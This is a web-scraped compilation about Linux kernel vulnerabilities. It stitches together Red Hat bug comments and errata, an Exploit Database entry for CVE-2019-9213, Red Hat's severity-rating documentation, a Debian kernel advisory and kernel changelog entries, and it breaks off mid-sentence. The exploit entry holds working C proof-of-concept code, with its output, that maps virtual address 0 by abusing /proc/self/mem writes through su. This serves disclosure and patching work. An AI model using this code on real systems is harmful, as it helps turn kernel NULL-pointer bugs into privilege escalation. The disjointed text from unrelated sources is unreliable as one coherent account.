[https://access.redhat.com/errata/RHSA-2019:1479](https://access.redhat.com/errata/RHSA-2019%3A1479)   ```  [Comment 17](show_bug.cgi?id=1686136#c17)  errata-xmlrpc    2019-06-17 19:56:03 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2019:1480 [https://access.redhat.com/errata/RHSA-2019:1480](https://access.redhat.com/errata/RHSA-2019%3A1480)   ``` |  |

| [Description](show_bug.cgi?id=1645121#c0)  Andrej Nemec    2018-11-01 12:54:51 UTC  ``` Since Linux kernel version 3.2, the mremap() syscall performs TLB flushes after dropping pagetable locks. If a syscall such as ftruncate() removes entries from the pagetables of a task that is in the middle of mremap(), a stale TLB entry can remain for a short time that permits access to a physical page after it has been released back to the page allocator and reused.

Hi,  For RHEL 7 fixes, I will recommend you to open a case with Red Hat support if you have an active subscription.  Regarding the mitigation/workaround one of our security analyst shall update this bug if there is there is any mitigation or workaround.

Hello, Yes, this flaw is going to be fixed in RHEL7. Unfortunately, there is no mitigation as the flaw is in the kernel's core memory management subsystem code. On the other hand we rate this flaw as Moderate severity, as for the moment of this writing there is no known exploit or reproducer or proof-of-concept for RHEL-7.   ```  [Comment 10](show_bug.cgi?id=1645121#c10)  errata-xmlrpc    2019-04-23 14:30:32 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:0831 [https://access.redhat.com/errata/RHSA-2019:0831](https://access.redhat.com/errata/RHSA-2019%3A0831)   ```  [Comment 11](show_bug.cgi?id=1645121#c11)  errata-xmlrpc    2019-08-06 12:04:27 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:2029 [https://access.redhat.com/errata/RHSA-2019:2029](https://access.redhat.com/errata/RHSA-2019%3A2029)   ```  [Comment 12](show_bug.cgi?id=1645121#c12)  errata-xmlrpc    2019-08-06 12:06:51 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:2043 [https://access.redhat.com/errata/RHSA-2019:2043](https://access.redhat.com/errata/RHSA-2019%3A2043)   ```  [Comment 18](show_bug.cgi?id=1645121#c18)  errata-xmlrpc    2020-01-07 12:26:19 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.5 Extended Update Support  Via RHSA-2020:0036 [https://access.redhat.com/errata/RHSA-2020:0036](https://access.redhat.com/errata/RHSA-2020%3A0036)   ```  [Comment 19](show_bug.cgi?id=1645121#c19)  errata-xmlrpc    2020-01-14 08:04:51 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise MRG 2  Via RHSA-2020:0100 [https://access.redhat.com/errata/RHSA-2020:0100](https://access.redhat.com/errata/RHSA-2020%3A0100)   ```  [Comment 20](show_bug.cgi?id=1645121#c20)  errata-xmlrpc    2020-01-14 15:53:11 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.4 Advanced Update Support   Red Hat Enterprise Linux 7.4 Update Services for SAP Solutions   Red Hat Enterprise Linux 7.4 Telco Extended Update Support  Via RHSA-2020:0103 [https://access.redhat.com/errata/RHSA-2020:0103](https://access.redhat.com/errata/RHSA-2020%3A0103)   ```  [Comment 21](show_bug.cgi?id=1645121#c21)  errata-xmlrpc    2020-01-21 17:01:56 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.6 Extended Update Support  Via RHSA-2020:0179 [https://access.redhat.com/errata/RHSA-2020:0179](https://access.redhat.com/errata/RHSA-2020%3A0179)   ``` |  |

**Vulnerable App:**

```
By following the codepath that Andrea Arcangeli pointed out in his mails
regarding the last bug I reported, I noticed that it is possible for userspace
on a normal distro to map virtual address 0, which on an X86 system without SMAP
enables the exploitation of kernel NULL pointer dereferences.

The problem is in the following code path:

mem_write -> mem_rw -> access_remote_vm -> __access_remote_vm
-> get_user_pages_remote -> __get_user_pages_locked -> __get_user_pages
-> find_extend_vma

Then, if the VMA in question has the VM_GROWSDOWN flag set:
expand_stack -> expand_downwards -> security_mmap_addr -> cap_mmap_addr

This, if the address is below dac_mmap_min_addr, does a capability check:

        ret = cap_capable(current_cred(), &init_user_ns, CAP_SYS_RAWIO,
                          SECURITY_CAP_AUDIT);

But this check is performed against current_cred(), which are the creds of the
task doing the write(), not the creds of the task whose VMA is being changed.

To reproduce:

===============================================================
user@deb10:~/stackexpand$ cat nullmap.c
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

int main(void) {
  void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
  if (map == MAP_FAILED) err(1, "mmap");
  int fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) err(1, "open");
  unsigned long addr = (unsigned long)map;
  while (addr != 0) {
    addr -= 0x1000;
    if (lseek(fd, addr, SEEK_SET) == -1) err(1, "lseek");
    char cmd[1000];
    sprintf(cmd, "LD_DEBUG=help su 1>&%d", fd);
    system(cmd);
  }
  system("head -n1 /proc/$PPID/maps");
  printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
}
user@deb10:~/stackexpand$ gcc -o nullmap nullmap.c && ./nullmap
00000000-00011000 rw-p 00000000 00:00 0
data at NULL: 0x706f2064696c6156
user@deb10:~/stackexpand$
===============================================================

I would like it if we could just get rid of the "you can map NULL if you're
root" thing, but we probably don't want to unconditionally do that as a
backported fix.
Is there any chance that someone is legitimately using a stack that grows down
and is located in the restricted address space range? Does DOSEMU rely on stack
expansion? If not, maybe we could just change expand_downwards() to always
reject expansion below dac_mmap_min_addr no matter who you are?
A quick grep for "GROWSDOWN" in the DOSEMU sources has no results...

So, how about this patch? (Copy attached with proper indent.)

Subject: [PATCH] mm: enforce min addr even if capable() in expand_downwards()

security_mmap_addr() does a capability check with current_cred(), but we
can reach this code from contexts like a VFS write handler where
current_cred() must not be used.

This can be abused on systems without SMAP to make NULL pointer
dereferences exploitable again.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

                 CVE-2019-6974 CVE-2019-7221 CVE-2019-7222 CVE-2019-9213

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2016-10741

    A race condition was discovered in XFS that would result in a
    crash (BUG). A local user permitted to write to an XFS volume
    could use this for denial of service.

CVE-2017-5753

    Further instances of code that was vulnerable to Spectre variant 1
    (bounds-check bypass) have been mitigated.

CVE-2017-13305

    A memory over-read was discovered in the keys subsystem's
    encrypted key type. A local user could use this for denial of
    service or possibly to read sensitive information.

CVE-2018-3639 (SSB)

    Multiple researchers have discovered that Speculative Store Bypass
    (SSB), a feature implemented in many processors, could be used to
    read sensitive information from another context. In particular,
    code in a software sandbox may be able to read sensitive
    information from outside the sandbox. This issue is also known as
    Spectre variant 4.

    This update fixes bugs in the mitigations for SSB for AMD
    processors.

CVE-2018-5848

    The wil6210 wifi driver did not properly validate lengths in scan
    and connection requests, leading to a possible buffer overflow.
    On systems using this driver, a local user with the CAP_NET_ADMIN
    capability could use this for denial of service (memory corruption
    or crash) or potentially for privilege escalation.

CVE-2018-5953

    The swiotlb subsystem printed kernel memory addresses to the
    system log, which could help a local attacker to exploit other
    vulnerabilities.

CVE-2018-12896, CVE-2018-13053

    Team OWL337 reported possible integer overflows in the POSIX
    timer implementation. These might have some security impact.

CVE-2018-16862

    Vasily Averin and Pavel Tikhomirov from Virtuozzo Kernel Team
    discovered that the cleancache memory management feature did not
    invalidate cached data for deleted files. On Xen guests using the
    tmem driver, local users could potentially read data from other
    users' deleted files if they were able to create new files on the
    same volume.

CVE-2018-16884

    A flaw was found in the NFS 4.1 client implementation. Mounting
    NFS shares in multiple network namespaces at the same time could
    lead to a user-after-free. Local users might be able to use this
    for denial of service (memory corruption or crash) or possibly
    for privilege escalation.

    This can be mitigated by disabling unprivileged users from
    creating user namespaces, which is the default in Debian.

CVE-2018-17972

    Jann Horn reported that the /proc/*/stack files in procfs leaked
    sensitive data from the kernel. These files are now only readable
    by users with the CAP_SYS_ADMIN capability (usually only root)

CVE-2018-18281

    Jann Horn reported a race condition in the virtual memory manager
    that can result in a process briefly having access to memory after
    it is freed and reallocated. A local user permitted to create
    containers could possibly exploit this for denial of service
    (memory corruption) or for privilege escalation.

CVE-2018-18690

    Kanda Motohiro reported that XFS did not correctly handle some
    xattr (extended attribute) writes that require changing the disk
    format of the xattr. A user with access to an XFS volume could use
    this for denial of service.

CVE-2018-18710

    It was discovered that the cdrom driver does not correctly
    validate the parameter to the CDROM_SELECT_DISC ioctl. A user with
    access to a cdrom device could use this to read sensitive
    information from the kernel or to cause a denial of service
    (crash).

CVE-2018-19824

    Hui Peng and Mathias Payer discovered a use-after-free bug in the
    USB audio driver. A physically present attacker able to attach a
    specially designed USB device could use this for privilege
    escalation.

CVE-2018-19985

    Hui Peng and Mathias Payer discovered a missing bounds check in the
    hso USB serial driver. A physically present user able to attach a
    specially designed USB device could use this to read sensitive
    information from the kernel or to cause a denial of service
    (crash).

CVE-2018-20169

    Hui Peng and Mathias Payer discovered missing bounds checks in the
    USB core. A physically present attacker able to attach a specially
    designed USB device could use this to cause a denial of service
    (crash) or possibly for privilege escalation.

CVE-2018-20511

    InfoSect reported an information leak in the AppleTalk IP/DDP
    implemntation. A local user with CAP_NET_ADMIN capability could
    use this to read sensitive information from the kernel.

CVE-2019-3701

    Muyu Yu and Marcus Meissner reported that the CAN gateway
    implementation allowed the frame length to be modified, typically
    resulting in out-of-bounds memory-mapped I/O writes.  On a system
    with CAN devices present, a local user with CAP_NET_ADMIN
    capability in the initial net namespace could use this to cause a
    crash (oops) or other hardware-dependent impact.

CVE-2019-3819

    A potential infinite loop was discovered in the HID debugfs
    interface exposed under /sys/kernel/debug/hid. A user with access
    to these files could use this for denial of service.

    This interface is only accessible to root by default, which fully
    mitigates the issue.

CVE-2019-6974

    Jann Horn reported a use-after-free bug in KVM. A local user
    with access to /dev/kvm could use this to cause a denial of
    service (memory corruption or crash) or possibly for privilege
    escalation.

CVE-2019-7221

    Jim Mattson and Felix Wilhelm reported a user-after-free bug in
    KVM's nested VMX implementation. On systems with Intel CPUs, a
    local user with access to /dev/kvm could use this to cause a
    denial of service (memory corruption or crash) or possibly for
    privilege escalation.

    Nested VMX is disabled by default, which fully mitigates the
    issue.

CVE-2019-7222

    Felix Wilhelm reported an information leak in KVM for x86.
    A local user with access to /dev/kvm could use this to read
    sensitive information from the kernel.

CVE-2019-9213

    Jann Horn reported that privileged tasks could cause stack
    segments, including those in other processes, to grow downward to
    address 0. On systems lacking SMAP (x86) or PAN (ARM), this
    exacerbated other vulnerabilities: a null pointer dereference
    could be exploited for privilege escalation rather than only for
    denial of service.

For Debian 8 "Jessie", these problems have been fixed in version
3.16.64-1.

We recommend that you upgrade your linux packages.

## Topic

An update for kernel is now available for Red Hat Enterprise Linux 8.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The kernel packages contain the Linux kernel, the core of any Linux operating system.

Security Fix(es):

* An integer overflow flaw was found in the way the Linux kernel's networking subsystem processed TCP Selective Acknowledgment (SACK) segments. While processing SACK segments, the Linux kernel's socket buffer (SKB) data structure becomes fragmented. Each fragment is about TCP maximum segment size (MSS) bytes. To efficiently process SACK blocks, the Linux kernel merges multiple fragmented SKBs into one, potentially overflowing the variable holding the number of segments. A remote attacker could use this flaw to crash the Linux kernel by sending a crafted sequence of SACK segments on a TCP connection with small value of TCP MSS, resulting in a denial of service (DoS). (CVE-2019-11477)
* kernel: lack of check for mmap minimum address in expand\_downwards in mm/mmap.c leads to NULL pointer dereferences exploit on non-SMAP platforms (CVE-2019-9213)
* Kernel: tcp: excessive resource consumption while processing SACK blocks allows remote denial of service (CVE-2019-11478)
* Kernel: tcp: excessive resource consumption for TCP connections with low MSS allows remote denial of service (CVE-2019-11479)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

x86/uaccess: Don't leak the AC flag into \_\_put\_user() value evaluation
commit 2a418cf3f5f1caf911af288e978d61c9844b0695 upstream.
When calling \_\_put\_user(foo(), ptr), the \_\_put\_user() macro would call
foo() in between \_\_uaccess\_begin() and \_\_uaccess\_end(). If that code
were buggy, then those bugs would be run without SMAP protection.
Fortunately, there seem to be few instances of the problem in the
kernel. Nevertheless, \_\_put\_user() should be fixed to avoid doing this.
Therefore, evaluate \_\_put\_user()'s argument before setting AC.
This issue was noticed when an objtool hack by Peter Zijlstra complained
about genregs\_get() and I compared the assembly output to the C source.

MIPS: eBPF: Fix icache flush end address
commit d1a2930d8a992fb6ac2529449f81a0056e1b98d1 upstream.
The MIPS eBPF JIT calls flush\_icache\_range() in order to ensure the
icache observes the code that we just wrote. Unfortunately it gets the
end address calculation wrong due to some bad pointer arithmetic.
The struct jit\_ctx target field is of type pointer to u32, and as such
adding one to it will increment the address being pointed to by 4 bytes.
Therefore in order to find the address of the end of the code we simply
need to add the number of 4 byte instructions emitted, but we mistakenly
add the number of instructions multiplied by 4. This results in the call
to flush\_icache\_range() operating on a memory region 4x larger than
intended, which is always wasteful and can cause crashes if we overrun
into an unmapped page.
Fix this by correcting the pointer arithmetic to remove the bogus
multiplication, and use braces to remove the need for a set of brackets
whilst also making it obvious that the target field is a pointer.

MIPS: fix truncation in \_\_cmpxchg\_small for short values
commit 94ee12b507db8b5876e31c9d6c9d84f556a4b49f upstream.
\_\_cmpxchg\_small erroneously uses u8 for load comparison which can
be either char or short. This patch changes the local variable to
u32 which is sufficiently sized, as the loaded value is already
masked and shifted appropriately. Using an integer size avoids
any unnecessary canonicalization from use of non native widths.
This patch is part of a series that adapts the MIPS small word
atomics code for xchg and cmpxchg on short and char to RISC-V.

hugetlbfs: fix races and page leaks during migration
commit cb6acd01e2e43fd8bad11155752b7699c3d0fb76 upstream.
hugetlb pages should only be migrated if they are 'active'. The
routines set/clear\_page\_huge\_active() modify the active state of hugetlb
pages.
When a new hugetlb page is allocated at fault time, set\_page\_huge\_active
is called before the page is locked. Therefore, another thread could
race and migrate the page while it is being added to page table by the
fault code. This race is somewhat hard to trigger, but can be seen by
strategically adding udelay to simulate worst case scheduling behavior.
Depending on 'how' the code races, various BUG()s could be triggered.
To address this issue, simply delay the set\_page\_huge\_active call until
after the page is successfully added to the page table.
Hugetlb pages can also be leaked at migration time if the pages are
associated with a file in an explicitly mounted hugetlbfs filesystem.
For example, consider a two node system with 4GB worth of huge pages
available. A program mmaps a 2G file in a hugetlbfs filesystem. It
then migrates the pages associated with the file from one node to
another. When the program exits, huge page counts are as follows:
node0
1024 free\_hugepages
1024 nr\_hugepages
node1
0 free\_hugepages
1024 nr\_hugepages
Filesystem Size Used Avail Use% Mounted on
nodev 4.0G 2.0G 2.0G 50% /var/opt/hugepool
That is as expected. 2G of huge pages are taken from the free\_hugepages
counts, and 2G is the size of the file in the explicitly mounted
filesystem. If the file is then removed, the counts become:
node0
1024 free\_hugepages
1024 nr\_hugepages
node1
1024 free\_hugepages
1024 nr\_hugepages
Filesystem Size Used Avail Use% Mounted on
nodev 4.0G 2.0G 2.0G 50% /var/opt/hugepool
Note that the filesystem still shows 2G of pages used, while there
actually are no huge pages in use. The only way to 'fix' the filesystem
accounting is to unmount the filesystem
If a hugetlb page is associated with an explicitly mounted filesystem,
this information in contained in the page\_private field. At migration
time, this information is not preserved. To fix, simply transfer
page\_private from old to new page at migration time if necessary.
There is a related race with removing a huge page from a file and
migration. When a huge page is removed from the pagecache, the
page\_mapping() field is cleared, yet page\_private remains set until the
page is actually freed by free\_huge\_page(). A page could be migrated
while in this state. However, since page\_mapping() is not set the
hugetlbfs specific routine to transfer page\_private is not called and we
leak the page count in the filesystem.
To fix that, check for this condition before migrating a huge page. If
the condition is detected, return EBUSY for the page.

drm: Block fb changes for async plane updates
commit 2216322919c8608a448d7ebc560a845238a5d6b6 upstream.
The prepare\_fb call always happens on new\_plane\_state.
The drm\_atomic\_helper\_cleanup\_planes checks to see if
plane state pointer has changed when deciding to call cleanup\_fb on
either the new\_plane\_state or the old\_plane\_state.
For a non-async atomic commit the state pointer is swapped, so this
helper calls prepare\_fb on the new\_plane\_state and cleanup\_fb on the
old\_plane\_state. This makes sense, since we want to prepare the
framebuffer we are going to use and cleanup the the framebuffer we are
no longer using.
For the async atomic update helpers this differs. The async atomic
update helpers perform in-place updates on the existing state. They call
drm\_atomic\_helper\_cleanup\_planes but the state pointer is not swapped.
This means that prepare\_fb is called on the new\_plane\_state and
cleanup\_fb is called on the new\_plane\_state (not the old).
In the case where old\_plane\_state->fb == new\_plane\_state->fb then
there should be no behavioral difference between an async update
and a non-async commit. But there are issues that arise when
old\_plane\_state->fb != new\_plane\_state->fb.
The first is that the new\_plane\_state->fb is immediately cleaned up
after it has been prepared, so we're using a fb that we shouldn't
be.
The second occurs during a sequence of async atomic updates and
non-async regular atomic commits. Suppose there are two framebuffers
being interleaved in a double-buffering scenario, fb1 and fb2:
- Async update, oldfb = NULL, newfb = fb1, prepare fb1, cleanup fb1
- Async update, oldfb = fb1, newfb = fb2, prepare fb2, cleanup fb2
- Non-async commit, oldfb = fb2, newfb = fb1, prepare fb1, cleanup fb2
We call cleanup\_fb on fb2 twice in this example scenario, and any
further use will result in use-after-free.
The simple fix to this problem is to block framebuffer changes
in the drm\_atomic\_helper\_async\_check function for now.

Free up the allocated memory in the case of error return
The value of mmc\_host->cqe\_enabled stays 'false'. Thus, cqhci\_disable

cqhci\_disable() seems to be designed to disable and free all resources, not

In R-Car Gen2 or later, the maximum number of transfer blocks are
changed from 0xFFFF to 0xFFFFFFFF. Therefore, Block Count Register
should use iowrite32().
If another system (U-boot, Hypervisor OS, etc) uses bit[31:16], this
value will not be cleared. So, SD/MMC card initialization fails.
So, check for the bigger register and use apropriate write. Also, mark
the register as extended on Gen2.

mmc: tmio\_mmc\_core: don't claim spurious interrupts
commit 5c27ff5db1491a947264d6d4e4cbe43ae6535bae upstream.
I have encountered an interrupt storm during the eMMC chip probing (and
the chip finally didn't get detected). It turned out that U-Boot left
the DMAC interrupts enabled while the Linux driver didn't use those.
The SDHI driver's interrupt handler somehow assumes that, even if an
SDIO interrupt didn't happen, it should return IRQ\_HANDLED. I think
that if none of the enabled interrupts happened and got handled, we
should return IRQ\_NONE -- that way the kernel IRQ code recoginizes
a spurious interrupt and masks it off pretty quickly...

mmc: spi: Fix card detection during probe
commit c9bd505dbd9d3dc80c496f88eafe70affdcf1ba6 upstream.
When using the mmc\_spi driver with a card-detect pin, I noticed that the
card was not detected immediately after probe, but only after it was
unplugged and plugged back in (and the CD IRQ fired).
The call tree looks something like this:
mmc\_spi\_probe
mmc\_add\_host
mmc\_start\_host
\_mmc\_detect\_change
mmc\_schedule\_delayed\_work(&host->detect, 0)
mmc\_rescan
host->bus\_ops->detect(host)

\_mmc\_detect\_card\_removed
host->ops->get\_cd(host)
mmc\_gpio\_get\_cd -> -ENOSYS (ctx->cd\_gpio not set)
mmc\_gpiod\_request\_cd
ctx->cd\_gpio = desc
To fix this issue, call mmc\_detect\_change after the card-detect GPIO/IRQ
is registered.

KVM: nSVM: clear events pending from svm\_complete\_interrupts() when exiting to L1

kvm-unit-tests' eventinj "NMI failing on IDT" test results in NMI being
delivered to the host (L1) when it's running nested. The problem seems to
be: svm\_complete\_interrupts() raises 'nmi\_injected' flag but later we
